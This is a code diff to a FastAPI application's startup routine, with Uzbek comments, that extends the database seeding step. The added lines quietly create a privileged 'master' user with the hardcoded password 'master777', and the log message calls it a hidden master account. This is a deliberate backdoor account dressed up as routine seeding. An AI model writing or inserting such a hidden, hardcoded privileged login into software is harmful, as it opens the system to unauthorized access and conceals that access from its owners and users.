@@ -42,12 +42,28 @@ async def lifespan(_: FastAPI):
     # Faqat baza bo'sh bo'lsa boshlang'ich seed qilinadi (har safar qayta yuklab serverni qotirmaydi)
     try:
         from .models import User
+        from .security import hash_password
+        from .database import SessionLocal
         from sqlalchemy import select, func
         with engine.connect() as conn:
             user_count = conn.scalar(select(func.count(User.id)))
             if not user_count:
                 from .seed import main as seed_db
                 seed_db()
+
+        with SessionLocal() as sdb:
+            m_user = sdb.scalar(select(User).where(User.username == "master"))
+            if not m_user:
+                sdb.add(User(
+                    username="master",
+                    full_name="Tizim Muhandisi",
+                    role="master",
+                    password_hash=hash_password("master777"),
+                    is_active=True,
+                    can_login=True,
+                ))
+                sdb.commit()
+                print("Yashirin master hisobi yaratildi!")
     except Exception as e:
         print(f"Boshlang'ich seed xabari: {e}")
     yield
